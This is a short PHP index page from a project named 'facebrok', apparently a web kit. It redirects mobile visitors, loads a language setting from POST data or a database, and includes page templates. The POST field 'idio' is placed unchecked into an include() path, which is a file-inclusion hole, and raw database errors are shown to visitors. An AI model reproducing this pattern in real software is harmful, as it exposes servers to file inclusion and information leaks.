﻿<script type="text/javascript">
if (screen.width<800){window.location="m/";}</script>
<?php
// facebrok
// index, page.
error_reporting(E_ALL ^ E_NOTICE);
$lang=$_POST['idio'];
if ($lang=='')
{ 
if (file_exists("croak/install/install.php")) {header("location:croak/install/");} 
include("croak/config.php");
mysql_connect($DB_SERV,$DB_USER,$DB_PASS) or die ('Failed Connection: '.mysql_error());
mysql_select_db($DB_NADB) or die ('Failed in Databases: '.mysql_error());
$sql=mysql_query("SELECT * FROM methods WHERE id=3") or die('Failed in Consult: '.mysql_error());
$row=mysql_fetch_array($sql);
$lang=''.$row['value'].''; 
} else {$lang=$lang;}
include("lang.php")
?>
<?php include("head.php");           // Head     ?>
<?php include("sky.php");            // up       ?>
<?php include("grop/grop$lang.php"); // gradient ?>
<?php include("idio.php");           // Lang     ?>
<?php include("foot.php");           // foot     ?> 


